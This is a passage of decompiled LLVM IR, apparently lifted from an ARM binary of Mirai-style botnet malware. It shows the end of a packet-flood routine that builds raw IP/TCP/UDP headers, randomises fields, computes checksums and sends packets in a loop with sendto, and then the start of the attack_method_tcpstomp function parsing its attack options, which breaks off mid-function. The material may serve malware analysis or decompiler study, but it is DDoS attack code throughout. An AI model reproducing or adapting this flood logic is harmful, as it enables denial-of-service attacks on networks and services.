  store i32 %v1_b174, i32* %r3.global-to-local, align 4
  %v1_b178 = and i32 %v4_b170, 251
  %v5_b17c = or i32 %v1_b178, %v4_b17c
  store i32 %v5_b17c, i32* %r2.global-to-local, align 4
  %v1_b180 = trunc i32 %v5_b17c to i8
  store i8 %v1_b180, i8* %v2_b170, align 1
  store i32 %v1_ace4, i32* %r1.global-to-local, align 4
  %v0_b188 = load i32, i32* @r8, align 4
  %v1_b188 = add i32 %v0_b188, 13
  %v2_b188 = inttoptr i32 %v1_b188 to i8*
  %v3_b188 = load i8, i8* %v2_b188, align 1
  %v4_b188 = zext i8 %v3_b188 to i32
  store i32 %v1_b18c, i32* %r2.global-to-local, align 4
  %v1_b190 = and i32 %v4_b188, 253
  %v4_b194 = or i32 %v1_b190, %v3_b194
  store i32 %v4_b194, i32* %r3.global-to-local, align 4
  %v1_b198 = trunc i32 %v4_b194 to i8
  store i8 %v1_b198, i8* %v2_b188, align 1
  store i32 %v1_ad04, i32* %ip.global-to-local, align 4
  %v0_b1a0 = load i32, i32* @r8, align 4
  %v1_b1a0 = add i32 %v0_b1a0, 13
  %v2_b1a0 = inttoptr i32 %v1_b1a0 to i8*
  %v3_b1a0 = load i8, i8* %v2_b1a0, align 1
  %v4_b1a0 = zext i8 %v3_b1a0 to i32
  %v1_b1a8 = and i32 %v4_b1a0, 254
  store i32 %v1_b1a8, i32* %r2.global-to-local, align 4
  %v2_b1ac = or i32 %v1_b1a8, %v1_b1a4
  store i32 %v2_b1ac, i32* %r3.global-to-local, align 4
  %v1_b1b0 = trunc i32 %v2_b1ac to i8
  store i8 %v1_b1b0, i8* %v2_b1a0, align 1
  %v3_b1b4 = load i32, i32* @r8, align 4
  %v4_b1b4 = add i32 %v3_b1b4, 14
  %v5_b1b4 = inttoptr i32 %v4_b1b4 to i16*
  store i16 %v1_b120, i16* %v5_b1b4, align 2
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v0_b1bc = load i32, i32* @r4, align 4
  %v1_b1bc = add i32 %v0_b1bc, 40
  store i32 %v1_b1bc, i32* %r0.global-to-local, align 4
  %v2_b1c0 = inttoptr i32 %v1_b1bc to i16*
  %v3_b1c0 = call i32 @rand_str(i16* %v2_b1c0, i32 %v6_ad1c)
  store i32 %v3_b1c0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_af14

dec_label_pc_b1c8:                                ; preds = %dec_label_pc_ad88
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %.pre = add i32 %v6_ad1c, 40
  br label %dec_label_pc_b1d8

dec_label_pc_b1d8:                                ; preds = %dec_label_pc_af28, %dec_label_pc_b1c8
  %storemerge6.pre-phi = phi i32 [ %v1_b018, %dec_label_pc_af28 ], [ %.pre, %dec_label_pc_b1c8 ]
  %v0_b1ec26 = phi i32 [ %v1_af1c, %dec_label_pc_af28 ], [ 0, %dec_label_pc_b1c8 ]
  store i32 %storemerge6.pre-phi, i32* @r7, align 4
  %storemerge4 = mul i32 %v6_ad1c, 65536
  %storemerge = add i32 %v6_ad1c, 20
  store i32 %storemerge, i32* @sl, align 4
  %v1_b1d8 = add i32 %storemerge4, 1310720
  store i32 %v1_b1d8, i32* %r2.global-to-local, align 4
  %tmp83 = udiv i32 %v1_b1d8, 256
  %v3_b1e0 = and i32 %tmp83, 65280
  store i32 %v3_b1e0, i32* %r3.global-to-local, align 4
  %v4_b1e4 = udiv i32 %v1_b1d8, 16777216
  %v5_b1e4 = or i32 %v3_b1e0, %v4_b1e4
  store i32 %v5_b1e4, i32* @r8, align 4
  %v2_b310 = icmp eq i32 %v1_ad3c, 0
  br label %dec_label_pc_b1e8

dec_label_pc_b1e8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4, %dec_label_pc_b1d8
  %v0_b1ec = phi i32 [ %v0_b1ec26, %dec_label_pc_b1d8 ], [ 0, %dec_label_pc_b2f4 ], [ 0, %dec_label_pc_b1e8 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b1ec = icmp eq i32 %v0_b1ec, 0
  store i1 %v2_b1ec, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b1ec, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b1f8:                                ; preds = %dec_label_pc_b1e8, %dec_label_pc_b2f4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b1fc

dec_label_pc_b1fc:                                ; preds = %dec_label_pc_b224, %dec_label_pc_b1f8
  %v1_b204 = phi i32 [ %v1_b2e4, %dec_label_pc_b224 ], [ 0, %dec_label_pc_b1f8 ]
  store i32 %v2_aba8, i32* %r2.global-to-local, align 4
  store i32 65536, i32* %r3.global-to-local, align 4
  %v4_b204 = mul i32 %v1_b204, 4
  %v5_b204 = add i32 %v4_b204, %v2_aba8
  %v6_b204 = inttoptr i32 %v5_b204 to i32*
  %v7_b204 = load i32, i32* %v6_b204, align 4
  store i32 %v7_b204, i32* @r4, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b20c = load i32, i32* @fp, align 4
  %v9_b20c = icmp eq i32 %v0_b20c, 65535
  store i1 %v9_b20c, i1* %cpsr_z.global-to-local, align 1
  %v1_b210 = add i32 %v7_b204, 20
  store i32 %v1_b210, i32* @r5, align 4
  br i1 %v9_b20c, label %dec_label_pc_b308, label %dec_label_pc_b218

dec_label_pc_b218:                                ; preds = %dec_label_pc_b1fc
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b31c

dec_label_pc_b224:                                ; preds = %dec_label_pc_b218, %dec_label_pc_b308, %dec_label_pc_b31c
  store i32 0, i32* %ip.global-to-local, align 4
  %v2_b228 = load i32, i32* @r4, align 4
  %v3_b228 = add i32 %v2_b228, 10
  %v4_b228 = inttoptr i32 %v3_b228 to i16*
  store i16 0, i16* %v4_b228, align 2
  store i32 20, i32* %r1.global-to-local, align 4
  %v0_b230 = load i32, i32* @r4, align 4
  store i32 %v0_b230, i32* @r0, align 4
  %v2_b234 = call i32 @checksum_generic(i32 %v0_b230, i32 20)
  %v3_b234 = trunc i32 %v2_b234 to i16
  store i32 %v2_b234, i32* %r0.global-to-local, align 4
  %v3_b238 = load i32, i32* %stack_var_-44, align 4
  store i32 %v2_ab98, i32* %r2.global-to-local, align 4
  %v3_b240 = mul i32 %v3_b238, 16
  %v2_b244 = add i32 %v3_b240, %v2_ab98
  store i32 %v2_b244, i32* %r1.global-to-local, align 4
  %v1_b248 = add i32 %v2_b244, 4
  %v2_b248 = inttoptr i32 %v1_b248 to i32*
  %v3_b248 = load i32, i32* %v2_b248, align 4
  %v3_b24c = mul i32 %v3_b248, 65536
  store i32 %v3_b24c, i32* %ip.global-to-local, align 4
  %tmp85 = mul i32 %v3_b248, 256
  %v1_b254 = and i32 %tmp85, 65280
  %tmp86 = udiv i32 %v3_b248, 256
  %v4_b258 = urem i32 %tmp86, 256
  %v5_b258 = or i32 %v4_b258, %v1_b254
  store i32 %v5_b258, i32* %r3.global-to-local, align 4
  %v1_b25c = add i32 %v3_b248, 1
  store i32 %v1_b25c, i32* %r2.global-to-local, align 4
  store i32 %v1_b25c, i32* %v2_b248, align 4
  %v0_b264 = load i32, i32* %r3.global-to-local, align 4
  %v1_b264 = load i32, i32* @r5, align 4
  %v2_b264 = add i32 %v1_b264, 4
  %v3_b264 = inttoptr i32 %v2_b264 to i32*
  store i32 %v0_b264, i32* %v3_b264, align 4
  %v0_b268 = load i32, i32* %r1.global-to-local, align 4
  %v1_b268 = add i32 %v0_b268, 8
  %v2_b268 = inttoptr i32 %v1_b268 to i32*
  %v3_b268 = load i32, i32* %v2_b268, align 4
  %tmp87 = mul i32 %v3_b268, 256
  %v1_b274 = and i32 %tmp87, 65280
  %tmp88 = udiv i32 %v3_b268, 256
  %v4_b278 = urem i32 %tmp88, 256
  %v5_b278 = or i32 %v4_b278, %v1_b274
  %v1_b27c = load i32, i32* @r5, align 4
  %v2_b27c = add i32 %v1_b27c, 8
  %v3_b27c = inttoptr i32 %v2_b27c to i32*
  store i32 %v5_b278, i32* %v3_b27c, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_b284 = load i32, i32* @r4, align 4
  %v4_b284 = add i32 %v3_b284, 10
  %v5_b284 = inttoptr i32 %v4_b284 to i16*
  store i16 %v3_b234, i16* %v5_b284, align 2
  %v0_b288 = load i32, i32* @r5, align 4
  store i32 %v0_b288, i32* @r1, align 4
  %v0_b28c = load i32, i32* %r3.global-to-local, align 4
  %v1_b28c = trunc i32 %v0_b28c to i16
  %v3_b28c = add i32 %v0_b288, 16
  %v4_b28c = inttoptr i32 %v3_b28c to i16*
  store i16 %v1_b28c, i16* %v4_b28c, align 2
  %v0_b290 = load i32, i32* @r8, align 4
  store i32 %v0_b290, i32* %r2.global-to-local, align 4
  %v0_b294 = load i32, i32* @sl, align 4
  store i32 %v0_b294, i32* %r3.global-to-local, align 4
  %v0_b298 = load i32, i32* @r4, align 4
  store i32 %v0_b298, i32* %r0.global-to-local, align 4
  %v4_b29c = call i32 @checksum_tcpudp(i32 %v0_b298, i32 %v0_b288, i32 %v0_b290, i32 %v0_b294)
  %v5_b29c = trunc i32 %v4_b29c to i16
  store i32 %v4_b29c, i32* %r0.global-to-local, align 4
  %v3_b2a0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2a0, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %ip.global-to-local, align 4
  %v3_b2a8 = mul i32 %v3_b2a0, 32
  store i32 %v3_b2a8, i32* %lr.global-to-local, align 4
  %v3_b2ac = load i32, i32* @r5, align 4
  %v4_b2ac = add i32 %v3_b2ac, 16
  %v5_b2ac = inttoptr i32 %v4_b2ac to i16*
  store i16 %v5_b29c, i16* %v5_b2ac, align 2
  %v0_b2b0 = load i32, i32* %lr.global-to-local, align 4
  %v1_b2b0 = load i32, i32* %r3.global-to-local, align 4
  %tmp105 = mul i32 %v1_b2b0, -8
  %v5_b2b0 = add i32 %v0_b2b0, %tmp105
  store i32 %v5_b2b0, i32* %lr.global-to-local, align 4
  %v0_b2b4 = load i32, i32* @r5, align 4
  %v1_b2b4 = add i32 %v0_b2b4, 2
  %v2_b2b4 = inttoptr i32 %v1_b2b4 to i16*
  %v3_b2b4 = load i16, i16* %v2_b2b4, align 2
  %v4_b2b4 = zext i16 %v3_b2b4 to i32
  store i32 %v4_b2b4, i32* @r5, align 4
  %v1_b2b8 = load i32, i32* %ip.global-to-local, align 4
  %v2_b2b8 = add i32 %v1_b2b8, %v5_b2b0
  store i32 %v2_b2b8, i32* @lr, align 4
  %v3_b2bc = add i32 %v2_b2b8, 2
  %v4_b2bc = inttoptr i32 %v3_b2bc to i16*
  store i16 %v3_b2b4, i16* %v4_b2bc, align 2
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_b2c8 = load i32, i32* @r4, align 4
  store i32 %v0_b2c8, i32* %r1.global-to-local, align 4
  %v0_b2cc = load i32, i32* @sb, align 4
  store i32 %v0_b2cc, i32* %r0.global-to-local, align 4
  %v0_b2d0 = load i32, i32* @r7, align 4
  store i32 %v0_b2d0, i32* %r2.global-to-local, align 4
  %v0_b2d4 = load i32, i32* @lr, align 4
  %v6_b2dc = call i32 @__libc_sendto(i32 %v0_b2cc, i32 %v0_b2c8, i32 %v0_b2d0, i32 16384, i32 %v0_b2d4, i32 16)
  %v3_b2e0 = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_b2e0, i32* %r3.global-to-local, align 4
  %v1_b2e4 = add i32 %v3_b2e0, 1
  store i32 %v1_b2e4, i32* %r0.global-to-local, align 4
  %v0_b2e8 = load i32, i32* @r6, align 4
  %v9_b2e8 = icmp eq i32 %v0_b2e8, %v1_b2e4
  store i1 %v9_b2e8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_b2e4, i32* %stack_var_-44, align 4
  %v8_b2f0 = icmp sgt i32 %v0_b2e8, %v1_b2e4
  br i1 %v8_b2f0, label %dec_label_pc_b1fc, label %dec_label_pc_b2f4

dec_label_pc_b2f4:                                ; preds = %dec_label_pc_b224
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_b2f8 = icmp eq i32 %v0_b2e8, 0
  store i1 %v2_b2f8, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %stack_var_-44, align 4
  br i1 %v2_b2f8, label %dec_label_pc_b1e8, label %dec_label_pc_b1f8

dec_label_pc_b308:                                ; preds = %dec_label_pc_b1fc
  %v0_b308 = call i32 @rand_next()
  %v1_b308 = trunc i32 %v0_b308 to i16
  store i32 %v0_b308, i32* %r0.global-to-local, align 4
  store i32 %v1_ad3c, i32* %r3.global-to-local, align 4
  store i1 %v2_b310, i1* %cpsr_z.global-to-local, align 1
  %v3_b314 = load i32, i32* @r4, align 4
  %v4_b314 = add i32 %v3_b314, 4
  %v5_b314 = inttoptr i32 %v4_b314 to i16*
  store i16 %v1_b308, i16* %v5_b314, align 2
  br i1 %v2_b310, label %dec_label_pc_b224, label %dec_label_pc_b308.dec_label_pc_b31c_crit_edge

dec_label_pc_b308.dec_label_pc_b31c_crit_edge:    ; preds = %dec_label_pc_b308
  %v0_b31c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_b31c

dec_label_pc_b31c:                                ; preds = %dec_label_pc_b308.dec_label_pc_b31c_crit_edge, %dec_label_pc_b218
  %v0_b31c = phi i32 [ %v0_b31c.pre, %dec_label_pc_b308.dec_label_pc_b31c_crit_edge ], [ %v7_b204, %dec_label_pc_b218 ]
  %v1_b31c = add i32 %v0_b31c, 40
  store i32 %v1_b31c, i32* %r0.global-to-local, align 4
  store i32 %v6_ad1c, i32* %r1.global-to-local, align 4
  %v2_b324 = inttoptr i32 %v1_b31c to i16*
  %v3_b324 = call i32 @rand_str(i16* %v2_b324, i32 %v6_ad1c)
  store i32 %v3_b324, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_b224

; uselistorder directives
  uselistorder i32 %v0_b308, { 1, 0 }
  uselistorder i32 %v1_b2e4, { 2, 0, 3, 4, 1 }
  uselistorder i32 %v5_b2b0, { 1, 0 }
  uselistorder i32 %v4_b29c, { 1, 0 }
  uselistorder i32 %v3_b268, { 1, 0 }
  uselistorder i32 %v3_b248, { 3, 2, 0, 1 }
  uselistorder i32 %v2_b234, { 1, 0 }
  uselistorder i1 %v2_b310, { 2, 3, 1, 0 }
  uselistorder i32 %v0_b120, { 1, 0 }
  uselistorder i32 %v0_b058, { 1, 0 }
  uselistorder i32 %v5_afec, { 1, 0 }
  uselistorder i32 %v0_afac, { 1, 0 }
  uselistorder i32 %v0_af68, { 1, 2, 0, 3 }
  uselistorder i32 %v1_af18, { 1, 0, 2, 3 }
  uselistorder i32 %v3_af04, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_ae90, { 1, 0 }
  uselistorder i32 %v6_ae88, { 0, 2, 1, 3 }
  uselistorder i1 %v9_aeb8, { 1, 0 }
  uselistorder i32 %v4_aecc, { 1, 0 }
  uselistorder i16 %stack_var_-62.2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_ae14, { 1, 0, 2 }
  uselistorder i32 %v0_afc4, { 1, 0, 2, 4, 5, 3 }
  uselistorder i32 %v4_ae04, { 1, 0 }
  uselistorder i1 %v7_adfc, { 1, 0, 2 }
  uselistorder i1 %v7_adb0, { 1, 0 }
  uselistorder i32 %v3_adac, { 1, 2, 0, 3 }
  uselistorder i32 %stack_var_-60.0, { 1, 0 }
  uselistorder i16 %stack_var_-62.0, { 1, 0 }
  uselistorder i32 %v1_b18c, { 1, 0 }
  uselistorder i32 %v1_b174, { 1, 0 }
  uselistorder i32 %v1_b15c, { 1, 0 }
  uselistorder i32 %v1_b144, { 1, 0 }
  uselistorder i32 %v1_b12c, { 1, 0 }
  uselistorder i32 %v3_aec4, { 1, 0 }
  uselistorder i1 %v2_aee0, { 1, 0 }
  uselistorder i32 %v1_aedc, { 1, 0 }
  uselistorder i32 %v4_aed8, { 2, 0, 1 }
  uselistorder i32 %v2_adec, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_ad88, { 1, 0 }
  uselistorder i1 %v7_ad80, { 1, 0 }
  uselistorder i1 %v7_ad54, { 1, 0 }
  uselistorder i32 %v3_ad50, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v1_ad3c, { 2, 3, 1, 0 }
  uselistorder i32 %v6_ad1c, { 9, 8, 2, 0, 1, 10, 5, 4, 6, 7, 3 }
  uselistorder i32 %v1_ad04, { 1, 0 }
  uselistorder i32 %v1_ace4, { 1, 0 }
  uselistorder i32 %v1_acc4, { 1, 0 }
  uselistorder i32 %v1_aca4, { 1, 0 }
  uselistorder i32 %v1_ac84, { 1, 0 }
  uselistorder i32 %v1_ac64, { 1, 0 }
  uselistorder i32 %v6_ac40, { 1, 0 }
  uselistorder i32 %v1_ac28, { 1, 0 }
  uselistorder i8 %v5_abe0, { 1, 0 }
  uselistorder i32 %v6_abc0, { 1, 0 }
  uselistorder i32 %v2_aba8, { 0, 3, 1, 2 }
  uselistorder i32 %v2_ab98, { 0, 7, 1, 4, 2, 5, 3, 6 }
  uselistorder i32* %stack_var_-44, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 14 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 0 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 33, 32, 34, 35, 36, 37, 38, 39, 40, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 44, 43, 45, 47, 46, 48, 50, 49, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 1, 4, 3, 5, 7, 6, 9, 8, 11, 10, 16, 12, 13, 14, 15, 20, 17, 18, 19, 22, 21, 23, 26, 25, 24, 27, 28, 29, 31, 32, 30, 33, 35, 34, 36, 37, 38, 40, 39, 41, 43, 42, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i1* %cpsr_z.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 15, 0, 16, 17, 14, 18, 19, 20, 21, 22, 23 }
  uselistorder i32 %arg2, { 3, 0, 1, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b224, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b1f8, { 1, 0 }
  uselistorder label %dec_label_pc_b1e8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_b1d8, { 1, 0 }
  uselistorder label %bb82, { 1, 0 }
  uselistorder label %bb80, { 1, 0 }
  uselistorder label %dec_label_pc_af44, { 2, 0, 1 }
  uselistorder label %dec_label_pc_af14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_ae50, { 2, 1, 3, 0 }
  uselistorder label %dec_label_pc_ae30, { 1, 0 }
  uselistorder label %dec_label_pc_ae0c, { 1, 0 }
  uselistorder label %bb71, { 1, 0 }
  uselistorder label %dec_label_pc_adbc, { 1, 0 }
  uselistorder label %dec_label_pc_ada0, { 1, 0 }
}

define i32 @attack_method_tcpstomp(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp = call i8 @__decompiler_undefined_function_1()
  %tmp34 = call i16 @__decompiler_undefined_function_3()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i16 @__decompiler_undefined_function_3()
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-336 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v27_b330 = load i32, i32* @lr, align 4
  store i32 16, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* @r4, align 4
  store i32 %arg4, i32* @r5, align 4
  store i32 %arg1, i32* @r6, align 4
  %v2_b34c = call i32 @calloc(i32 %arg1, i32 16)
  store i32 4, i32* %r1.global-to-local, align 4
  %v0_b358 = load i32, i32* @r6, align 4
  store i32 %v0_b358, i32* %r0.global-to-local, align 4
  %v2_b35c = call i32 @calloc(i32 %v0_b358, i32 4)
  %v0_b360 = load i32, i32* @r5, align 4
  store i32 %v0_b360, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b370 = load i32, i32* @r4, align 4
  store i32 %v0_b370, i32* %r0.global-to-local, align 4
  %v5_b374 = inttoptr i32 %v0_b360 to i32*
  %v6_b374 = call i32 @attack_get_opt_int(i32 %v0_b370, i32* %v5_b374, i32 2, i32 0)
  %v1_b380 = urem i32 %v6_b374, 256
  store i32 %v1_b380, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  %v0_b38c = load i32, i32* @r5, align 4
  store i32 %v0_b38c, i32* %r1.global-to-local, align 4
  %v0_b390 = load i32, i32* @r4, align 4
  store i32 %v0_b390, i32* %r0.global-to-local, align 4
  %v5_b394 = trunc i32 %v6_b374 to i8
  %v6_b398 = inttoptr i32 %v0_b38c to i32*
  %v7_b398 = call i32 @attack_get_opt_int(i32 %v0_b390, i32* %v6_b398, i32 3, i32 65535)
  %v0_b39c = load i32, i32* @r5, align 4
  store i32 %v0_b39c, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 %v7_b398, i32* @r7, align 4
  %v0_b3ac = load i32, i32* @r4, align 4
  store i32 %v0_b3ac, i32* %r0.global-to-local, align 4
  %v4_b3b0 = inttoptr i32 %v0_b39c to i32*
  %v5_b3b0 = call i32 @attack_get_opt_int(i32 %v0_b3ac, i32* %v4_b3b0, i32 4, i32 64)
  %v1_b3b8 = urem i32 %v5_b3b0, 256
  store i32 %v1_b3b8, i32* %ip.global-to-local, align 4
  %v0_b3bc = load i32, i32* @r5, align 4
  store i32 %v0_b3bc, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b3c8 = load i32, i32* @r4, align 4
  store i32 %v0_b3c8, i32* %r0.global-to-local, align 4
  %v6_b3d0 = inttoptr i32 %v0_b3bc to i32*
  %v7_b3d0 = call i32 @attack_get_opt_int(i32 %v0_b3c8, i32* %v6_b3d0, i32 5, i32 1)
  %v1_b3dc = urem i32 %v7_b3d0, 256
  store i32 %v1_b3dc, i32* %ip.global-to-local, align 4
  store i32 65535, i32* %r3.global-to-local, align 4
  %v0_b3e4 = load i32, i32* @r5, align 4
  store i32 %v0_b3e4, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v0_b3ec = load i32, i32* @r4, align 4
  store i32 %v0_b3ec, i32* %r0.global-to-local, align 4
  %v5_b3f4 = inttoptr i32 %v0_b3e4 to i32*
  %v6_b3f4 = call i32 @attack_get_opt_int(i32 %v0_b3ec, i32* %v5_b3f4, i32 7, i32 65535)
  %v0_b3f8 = load i32, i32* @r5, align 4
  store i32 %v0_b3f8, i32* %r1.global-to-local, align 4
  %v3_b3fc = mul i32 %v6_b3f4, 65536
  store i32 %v3_b3fc, i32* %ip.global-to-local, align 4
  store i32 11, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b408 = load i32, i32* @r4, align 4
  store i32 %v0_b408, i32* %r0.global-to-local, align 4
  %v3_b40c = urem i32 %v6_b3f4, 65536
  store i32 %v3_b40c, i32* @sl, align 4
  %v4_b410 = inttoptr i32 %v0_b3f8 to i32*
  %v5_b410 = call i32 @attack_get_opt_int(i32 %v0_b408, i32* %v4_b410, i32 11, i32 0)
  %v1_b418 = urem i32 %v5_b410, 256
  store i32 %v1_b418, i32* %ip.global-to-local, align 4
  %v0_b41c = load i32, i32* @r5, align 4
  store i32 %v0_b41c, i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b428 = load i32, i32* @r4, align 4
  store i32 %v0_b428, i32* %r0.global-to-local, align 4
  %v5_b430 = inttoptr i32 %v0_b41c to i32*
  %v6_b430 = call i32 @attack_get_opt_int(i32 %v0_b428, i32* %v5_b430, i32 12, i32 1)
  %v1_b438 = urem i32 %v6_b430, 256
  store i32 %v1_b438, i32* %ip.global-to-local, align 4
  %v0_b43c = load i32, i32* @r5, align 4
  store i32 %v0_b43c, i32* %r1.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b448 = load i32, i32* @r4, align 4
  store i32 %v0_b448, i32* %r0.global-to-local, align 4
  %v5_b450 = inttoptr i32 %v0_b43c to i32*
  %v6_b450 = call i32 @attack_get_opt_int(i32 %v0_b448, i32* %v5_b450, i32 13, i32 1)
  %v1_b458 = urem i32 %v6_b450, 256
  store i32 %v1_b458, i32* %ip.global-to-local, align 4
  %v0_b45c = load i32, i32* @r5, align 4
  store i32 %v0_b45c, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b468 = load i32, i32* @r4, align 4
  store i32 %v0_b468, i32* %r0.global-to-local, align 4
  %v5_b470 = inttoptr i32 %v0_b45c to i32*
  %v6_b470 = call i32 @attack_get_opt_int(i32 %v0_b468, i32* %v5_b470, i32 14, i32 0)
  %v1_b478 = urem i32 %v6_b470, 256
  store i32 %v1_b478, i32* %ip.global-to-local, align 4
  %v0_b47c = load i32, i32* @r5, align 4
  store i32 %v0_b47c, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b488 = load i32, i32* @r4, align 4
  store i32 %v0_b488, i32* %r0.global-to-local, align 4
  %v5_b490 = inttoptr i32 %v0_b47c to i32*
  %v6_b490 = call i32 @attack_get_opt_int(i32 %v0_b488, i32* %v5_b490, i32 15, i32 0)
  %v1_b498 = urem i32 %v6_b490, 256
  store i32 %v1_b498, i32* %ip.global-to-local, align 4
  %v0_b49c = load i32, i32* @r5, align 4
  store i32 %v0_b49c, i32* %r1.global-to-local, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_b4a8 = load i32, i32* @r4, align 4
  store i32 %v0_b4a8, i32* %r0.global-to-local, align 4
  %v5_b4b0 = inttoptr i32 %v0_b49c to i32*
  %v6_b4b0 = call i32 @attack_get_opt_int(i32 %v0_b4a8, i32* %v5_b4b0, i32 16, i32 0)
  %v1_b4b8 = urem i32 %v6_b4b0, 256
  store i32 %v1_b4b8, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 768, i32* %r3.global-to-local, align 4
  %v0_b4c4 = load i32, i32* @r5, align 4
  store i32 %v0_b4c4, i32* %r1.global-to-local, align 4
  %v0_b4c8 = load i32, i32* @r4, align 4
  store i32 %v0_b4c8, i32* %r0.global-to-local, align 4
  %v5_b4d0 = inttoptr i32 %v0_b4c4 to i32*
  %v6_b4d0 = call i32 @attack_get_opt_int(i32 %v0_b4c8, i32* %v5_b4d0, i32 0, i32 768)
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_b4e0 = load i32, i32* @r5, align 4
  store i32 %v0_b4e0, i32* %r1.global-to-local, align 4
  %v0_b4e4 = load i32, i32* @r4, align 4
  store i32 %v0_b4e4, i32* %r0.global-to-local, align 4
  %v4_b4e8 = inttoptr i32 %v0_b4e0 to i32*
  %v5_b4e8 = call i32 @attack_get_opt_int(i32 %v0_b4e4, i32* %v4_b4e8, i32 1, i32 1)
  %v1_b4f0 = urem i32 %v5_b4e8, 256
